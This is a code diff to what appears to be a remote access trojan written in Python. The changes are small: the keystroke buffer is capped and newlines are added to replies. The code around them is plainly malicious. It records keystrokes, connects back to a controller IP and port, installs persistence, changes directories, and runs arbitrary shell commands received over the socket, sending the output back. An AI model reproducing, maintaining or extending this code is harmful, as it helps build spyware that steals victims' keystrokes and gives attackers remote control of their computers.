@@ -55,7 +55,7 @@ def on_press(key):
     global keylog_buffer, buffer_auto_send_pending
 
     formatted = format_key(key)
-    if formatted:
+    if formatted and len(keylog_buffer) < MAX_BUFFER_SIZE:
         keylog_buffer.append(formatted)
     
     if len(keylog_buffer) >= MAX_BUFFER_SIZE:
@@ -178,7 +178,7 @@ def connect():
     try:
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c.connect((IP, PORT))
-        c.send(b"[#] Client connected\n")
+        c.send(b"[#] Client connected\n\n")
         return c
     except Exception as e:
         print(f'Connection error: {e}')
@@ -219,7 +219,7 @@ def cmd(c, data):
                 os.chdir(data[3:].strip())
             except Exception as e:
                 print(f'CD function error: {e}')            
-            c.send(b"[i] Directory changed")
+            c.send(b"[i] Directory changed\n\n")
             return
 
         if data == "/persistence status":
@@ -232,7 +232,7 @@ def cmd(c, data):
 
         elif data == "/persistence setup":
             setup_persistence()
-            c.send(b"[+] Done\n")
+            c.send(b"[+] Done\n\n")
             return
 
         elif data == "/keylog start":
@@ -271,7 +271,7 @@ def cmd(c, data):
             output = p.stdout.read() + p.stderr.read()
 
             if output:
-                c.send(output + b"\n")
+                c.send(output + b"\n\n")
             else:
                 c.send(b"[+] Command executed\n\n")
 
